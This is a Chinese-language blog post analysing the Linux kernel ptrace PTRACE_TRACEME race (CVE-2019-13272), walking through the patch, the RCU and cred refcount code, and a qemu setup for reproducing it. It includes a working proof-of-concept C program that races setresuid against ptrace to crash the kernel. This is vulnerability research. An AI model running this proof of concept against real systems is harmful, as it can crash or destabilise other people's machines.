# CVE-2019-13272 'PTRACE_TRACEME' 本地提权漏洞分析（一）

阅读量 **298875**

|评论 **2**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2019-08-07 11:30:05

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p2.ssl.qhimg.com/t014df955e6e710882d.jpg)

## 漏洞信息

这个漏洞是 jannh 在今年 7月份发现的  
[漏洞来源](https://bugs.chromium.org/p/project-zero/issues/detail?id=1903)

  * 影响版本 Linux Kernel 5.1.17
  * 本地提权

## 漏洞补丁

[漏洞补丁](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=6994eefb0053799d2e07cd140df6c2ea106c41ee)

    
    
    diff --git a/kernel/ptrace.c b/kernel/ptrace.c
    index 8456b6e..705887f 100644
    --- a/kernel/ptrace.c
    +++ b/kernel/ptrace.c
    @@ -79,9 +79,7 @@ void __ptrace_link(struct task_struct *child, struct task_struct *new_parent,
      */
     static void ptrace_link(struct task_struct *child, struct task_struct *new_parent)
     {
    -    rcu_read_lock();
    -    __ptrace_link(child, new_parent, __task_cred(new_parent));
    -    rcu_read_unlock();
    +    __ptrace_link(child, new_parent, current_cred());
     }
    

漏洞的补丁十分的简单，  
不使用 rcu 机制，`__task_cred(new_parent))` 变成`current_cred()`

jannh 发布的信息中提出了两个问题，在这里我们先对第一个问题做分析

## 前置知识

这里是代码分析的时候涉及的一些知识点, 只做简单的描述，不做太详细的介绍

###  linux rcu 机制

rcu (Read-Copy Update) 是linux 中用的比较多的同步机制，它保护的是指针  
rcu 使用在 读多写少的情况下，允许多个读者和写者  
读者之间不需要同步，但如果存在多个写者时，在写者把更新后的“副本”覆盖到原数据时，写者与写者之间需要利用其他同步机制保证同步。

**常用函数**  
rcu_read_lock()  
rcu_read_unlock()

在读取rcu指针的时候需要加上，例如前面的

    
    
        rcu_read_lock();
        __ptrace_link(child, new_parent, __task_cred(new_parent));
        rcu_read_unlock();
    

读者是可以嵌套的，也就是说rcu_read_lock()可以嵌套调用.  
rcu_read_lock()和rcu_read_unlock()用来保持一个读者的RCU临界区. 该临界区上不允许上下文切换（禁止和启用抢占）

rcu_dereference()  
有 rcu 标签的指针不能直接使用，读者要调用rcu_dereference来获得一个被RCU保护的指针.

synchronize_rcu()  
用来等待之前的读者全部退出，读端临界区的检查是全局的，系统中有任何的代码处于读端临界区，synchronize_rcu()
都会阻塞，直到所有读端临界区结束才会返回，用在可睡眠的环境下.

call_rcu()  
用在不可睡眠的条件中,如果中断环境,禁止抢占环境等.

###  linux ptrace 机制

这个应该都是比较熟悉的，gdb的实现就是用的ptrace系统调用  
它的实现原型如下

    
    
    #include <sys/ptrace.h> 
    int ptrace(int request, int pid, int addr, int data);
    

它提供了父进程控制子进程的方法，用户可以借助它实现断点和调试  
request参数决定了系统调用的功能  
它只能调试属于自己用户的进程，种显而易见的限制就是普通用户的ptrace不能调试root进程

`PTRACE_ATTACH` trace指定 pid 对应的进程  
`PTRACE_DETACH` 结束 trace  
`PTRACE_TRACEME` 本进程将被父进程trace(告诉别人，来trace我呀)  
`PTRACE_SYSCALL, PTRACE_CONT` 重新运行。  
`PTRACE_PEEKTEXT, PTRACE_PEEKDATA` 从内存地址中读取一个字节，内存地址由addr给出。  
`PTRACE_PEEKUSR`从USER区域中读取一个字节，偏移量为addr。  
`PTRACE_POKEUSR` 往USER区域中写入一个字节。偏移量为addr。

###  setresuid 函数实现

setresuid 函数原型`int setresuid(uid_t ruid, uid_t euid, uid_t suid);`  
设置程序运行的 ruid, euid 和 suid,  
执行的条件有

    
    
    1.当前进程的euid是root
    2. 三个参数，每一个等于原来某个id中的一个
    

满足以上条件的任意一个，setresuid()都可以正常调用，并执行  
例如，如果原来 ruid = 100,euid =300, suid =200  
那么 `setresuid(200,300,100)` 可以成功，但是`setresuid(100,200,400)` 就会失败，当然 euid = 0
的时候就是 root 权限了，要设置成其他的用户id 也是没有问题的

setresuid 函数实现在
[kernel/sys.c](https://elixir.bootlin.com/linux/v5.1.16/source/kernel/sys.c#L621)  
主要逻辑如下, 省略了一些代码

    
    
     long __sys_setresuid(uid_t ruid, uid_t euid, uid_t suid)
    {
        struct user_namespace *ns = current_user_ns();
        const struct cred *old;
        struct cred *new;
    ....
        new = prepare_creds();
    ...
        old = current_cred();
    ...// some check
        return commit_creds(new);
    ...
    }
    

可以看到，它会调用 prepare_creds 生成一个新的 cred, 然后 根据old cred和检查传进来的参数是否合法，合法机会运行
commit_creds 替换成新的  
commit cred 在
[kernel/cred.c](https://elixir.bootlin.com/linux/v5.1.16/source/kernel/cred.c#L425)

    
    
    int commit_creds(struct cred *new)
    {
        struct task_struct *task = current;
        const struct cred *old = task->real_cred;
    ...
        BUG_ON(task->cred != old);
    ...
        BUG_ON(atomic_read(&new->usage) < 1);
    
        get_cred(new); /* we will require a ref for the subj creds too */
    
    ...
    rcu_assign_pointer(task->real_cred, new);
        rcu_assign_pointer(task->cred, new);
    ...//some check
    
        /* release the old obj and subj refs both */
        put_cred(old);
        put_cred(old);
        return 0;
    }
    EXPORT_SYMBOL(commit_creds);
    

commit_creds 主要将传入的 new_cred 替换原来的 task->real_cred 和 task->cred, 然后调用了 两次
put_cred 解除 old cred 的引用

put_cred 实现在
[kernel/cred.c](https://elixir.bootlin.com/linux/v5.1.16/source/kernel/cred.c#L136)

    
    
    static inline void put_cred(const struct cred *_cred)
    {
        struct cred *cred = (struct cred *) _cred;
    
        if (cred) {
            validate_creds(cred);
            if (atomic_dec_and_test(&(cred)->usage))
                __put_cred(cred);
        }
    }
    static inline int atomic_dec_and_test(atomic_t *v)
    {
        return __sync_sub_and_fetch(&v->counter, 1) == 0;
    }
    

`atomic_dec_and_test` 会将 cred 的引用 减 1，并返回结果是否为0  
结果为0 时表示 这个cred已经没有被引用了，会调用 `__put_cred` 函数

    
    
    void __put_cred(struct cred *cred)
    {
        kdebug("__put_cred(%p{%d,%d})", cred,
               atomic_read(&cred->usage),
               read_cred_subscribers(cred));
    
        BUG_ON(atomic_read(&cred->usage) != 0);
    #ifdef CONFIG_DEBUG_CREDENTIALS
        BUG_ON(read_cred_subscribers(cred) != 0);
        cred->magic = CRED_MAGIC_DEAD;
        cred->put_addr = __builtin_return_address(0);
    #endif
        BUG_ON(cred == current->cred);
        BUG_ON(cred == current->real_cred);
    
        call_rcu(&cred->rcu, put_cred_rcu);
    }
    EXPORT_SYMBOL(__put_cred);
    

前面做了一堆的检查，从前面我们知道`call_rcu` 是用在不可中断的环境中，最终调用的是 `put_cred_rcu` 函数

    
    
    static void put_cred_rcu(struct rcu_head *rcu)
    {
        struct cred *cred = container_of(rcu, struct cred, rcu);
    
        kdebug("put_cred_rcu(%p)", cred);
    
    #ifdef CONFIG_DEBUG_CREDENTIALS
        if (cred->magic != CRED_MAGIC_DEAD ||
            atomic_read(&cred->usage) != 0 ||
            read_cred_subscribers(cred) != 0)
            panic("CRED: put_cred_rcu() sees %p with"
                  " mag %x, put %p, usage %d, subscr %dn",
                  cred, cred->magic, cred->put_addr,
                  atomic_read(&cred->usage),
                  read_cred_subscribers(cred));
    #else
        if (atomic_read(&cred->usage) != 0)
            panic("CRED: put_cred_rcu() sees %p with usage %dn",
                  cred, atomic_read(&cred->usage));
    #endif
    
        security_cred_free(cred);
        key_put(cred->session_keyring);
        key_put(cred->process_keyring);
        key_put(cred->thread_keyring);
        key_put(cred->request_key_auth);
        if (cred->group_info)
            put_group_info(cred->group_info);
        free_uid(cred->user);
        put_user_ns(cred->user_ns);
        kmem_cache_free(cred_jar, cred);
    }
    

主要就是解除cred 的一些引用，最后调用 `kmem_cache_free` 释放这一块内存

## 漏洞分析

okay 终于完了，接下来我们正式看一下这个漏洞

###  漏洞触发点

漏洞出现在 ptrace 使用request 参数为 PTRACE_TRACEME的时候  
它的调用链如下

`ptrace` ->`ptrace_traceme` -> `ptrace_link` -> `__ptrace_link`

我们一个一个看

在
[kernel/ptrace.c](https://elixir.bootlin.com/linux/v5.1.16/source/kernel/ptrace.c)

    
    
    SYSCALL_DEFINE4(ptrace, long, request, long, pid, unsigned long, addr,
            unsigned long, data)
    {
        struct task_struct *child;
        long ret;
    
        if (request == PTRACE_TRACEME) {
            ret = ptrace_traceme();
            if (!ret)
                arch_ptrace_attach(current);
            goto out;
        }
    

ptrace 系统调用 传入 PTRACE_TRACEME request 的时候会进入 ptrace_traceme 函数，没有什么，进入看看

    
    
    static int ptrace_traceme(void)
    {
        int ret = -EPERM;
    
        write_lock_irq(&tasklist_lock);
        /* Are we already being traced? */
        if (!current->ptrace) {
            ret = security_ptrace_traceme(current->parent);
    ...
            if (!ret && !(current->real_parent->flags & PF_EXITING)) {
            // 设置当前进程 被 trace
                current->ptrace = PT_PTRACED;
                ptrace_link(current, current->real_parent);
            }
        }
        write_unlock_irq(&tasklist_lock);
        return ret;
    }
    

`ptrace_traceme`前面做一些权限检查，然后设置当前进程被 trace ,调用 `ptrace_link` 函数, 注意这里传入的第二个参数是
`current->real_parent` 也就是其父进程的 task_struct

    
    
    static void ptrace_link(struct task_struct *child, struct task_struct *new_parent)
    {
        rcu_read_lock();
        __ptrace_link(child, new_parent, __task_cred(new_parent));
        rcu_read_unlock();
    }
    #define __task_cred(task)    
        rcu_dereference((task)->real_cred)
    

主要看第三个参数 `__task_cred(new_parent)` 这一句，它调用`rcu_dereference` 获取
`new_parent->real_cred` 的引用，也就是父进程的 cred 结构体的地址啦

接着传入了 `__ptrace_link`函数

    
    
    void __ptrace_link(struct task_struct *child, struct task_struct *new_parent,
               const struct cred *ptracer_cred)
    {
        BUG_ON(!list_empty(&child->ptrace_entry));
        list_add(&child->ptrace_entry, &new_parent->ptraced);
        child->parent = new_parent;
        child->ptracer_cred = get_cred(ptracer_cred);
    }
    //------------------     static inline const struct cred *get_cred(const struct cred *cred)
    {
        struct cred *nonconst_cred = (struct cred *) cred;
        if (!cred)
            return cred;
        validate_creds(cred);
        return get_new_cred(nonconst_cred);
    }
    //----------------    static inline struct cred *get_new_cred(struct cred *cred)
    {
        atomic_inc(&cred->usage);
        return cred;
    }
    

最后一句 `child->ptracer_cred = get_cred(ptracer_cred);` 子进程保存了父进程的 cred 结构体 到
`ptracer_cred` 字段里面, `get_cred` 作用是让cred的引用计数+1，这里也是漏洞点所在。  
结合前面我们对 `setresuid` 函数的分析，接入在 `get_cred` 函数调用之前 父进程调用了 `setresuid`函数，那么原来的
cred 就会被替换，原来的 cred 结构体的引用计数可能就变成 0 了，这个时候会通过 `call_rcu` 调用`put_cred_rcu`
来释放这块内存，如果这个时候 get_cred 被调用了,引用计数 +1, 就会触发下面代码，产生 kernel panic

    
    
        if (atomic_read(&cred->usage) != 0)
            panic("CRED: put_cred_rcu() sees %p with usage %dn",
                  cred, atomic_read(&cred->usage));
    

###  poc 分析

下面 jannh 给出 的poc

    
    
     #define _GNU_SOURCE
    #include <unistd.h>
    #include <signal.h>
    #include <sched.h>
    #include <err.h>
    #include <sys/prctl.h>
    #include <sys/types.h>
    #include <sys/ptrace.h>
    
    int grandchild_fn(void *dummy) {
      if (ptrace(PTRACE_TRACEME, 0, NULL, NULL))
        err(1, "traceme");
      return 0;
    }
    
    int main(void) {
      pid_t child = fork();
      if (child == -1) err(1, "fork");
    
      /* child */
      if (child == 0) {
        static char child_stack[0x100000];
        prctl(PR_SET_PDEATHSIG, SIGKILL);
        while (1) {
          if (clone(grandchild_fn, child_stack+sizeof(child_stack), CLONE_FILES|CLONE_FS|CLONE_IO|CLONE_PARENT|CLONE_VM|CLONE_SIGHAND|CLONE_SYSVSEM|CLONE_VFORK, NULL) == -1)
            err(1, "clone failed");
        }
      }
      /* parent */
      uid_t uid = getuid();
      while (1) {
        // 
        if (setresuid(uid, uid, uid)) err(1, "setresuid");
      }
    }
    

poc 十分简单

  * task A fork 出 task B
  * task A 不断 setresuid 更新自己的 cred
  * task B 不断调用 `ptrace(PTRACE_TRACEME, 0, NULL, NULL)` 尝试触发竞争

主要能够在 task A `put_cred_rcu` 被调用的时候 ,task B 运行到 `get_cred` 就可以触发内核panic

###  漏洞复现

**测试环境搭建**

测试环境可以直接安装个 ubuntu 的虚拟机来测  
这里笔者使用 qemu 来做测试，测试环境笔者参考了 syzkaller 的环境配置  
[参考设置](https://github.com/google/syzkaller/blob/master/docs/linux/setup_ubuntu-host_qemu-vm_x86-64-kernel.md)

[linux
源码下载](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/snapshot/linux-6994eefb0053799d2e07cd140df6c2ea106c41ee.tar.gz)  
下载后 编辑 `kernel/ptrace.c` 改成有bug 的版本

    
    
      */                                                                                
    static void ptrace_link(struct task_struct *child, struct task_struct *new_parent) 
    {                                                                                  
        rcu_read_lock();                                                               
        __ptrace_link(child, new_parent, __task_cred(new_parent));                     
        rcu_read_unlock();                                                             
        /*__ptrace_link(child, new_parent, current_cred());*/                          
    }
    
    
    
    make defconfig
    make menuconfig
    // 编辑 .config, 在最后加上 
    // CONFIG_CONFIGFS_FS=y
    // CONFIG_SECURITYFS=y
    make oldconfig
    make -j16
    

文件系统笔者使用了 syzkaller 中的
[create_image.sh](https://github.com/google/syzkaller/blob/master/tools/create-image.sh) 来创建

完成之后可以用下面命令运行

    
    
    qemu-system-x86_64 -kernel ./linux/arch/x86_64/boot/bzImage  -append "console=ttyS0 root=/dev/sda debug earlyprintk=serial nokaslr" -hda strechsome/stretch.img -net user,hostfwd=tcp::10021-:22 -net nic -enable-kvm  -nographic -m 2G  -smp 2 -s
    

因为它这里需要竞争，`call_rcu` 函数又是不可中断的，所以在单个cpu下要触发很难，这里设置参数`-smp 2` 给了两个cp

**poc 测试**

把上面的 poc 编译好之后拷贝到 文件系统里面

    
    
    gcc poc.c --static
    mount strechsome/stretch.img ./tmp
    cp ./a.out ./tmp
    umount ./tmp
    

运行虚拟机你会发现下面的崩溃

![](https://p3.ssl.qhimg.com/t0156a14f9ab1d039d4.png)

## 总结

这个漏洞还是比较简单的，复现条件不会十分的苛刻，ptrace之前自己也学过一段时间，也看过一些源码，但是没有关注到这个部分的内容, jannh 真实tql。  
下一篇文章我会分析jannh 提出的第二个问题

## reference

<https://www.4hou.com/vulnerable/19464.html>  
<https://bugs.chromium.org/p/project-zero/issues/detail?id=1903>

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **rtfingc** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/183438](/post/id/183438)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [漏洞分析](/tag/漏洞分析)
  * [CVE](/tag/CVE)
  * [linux](/tag/linux)
  * [本地提权](/tag/本地提权)

 **+1** __6赞

 __收藏

![](https://p1.ssl.qhimg.com/t0194acf280719427c3.png) rtfingc

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

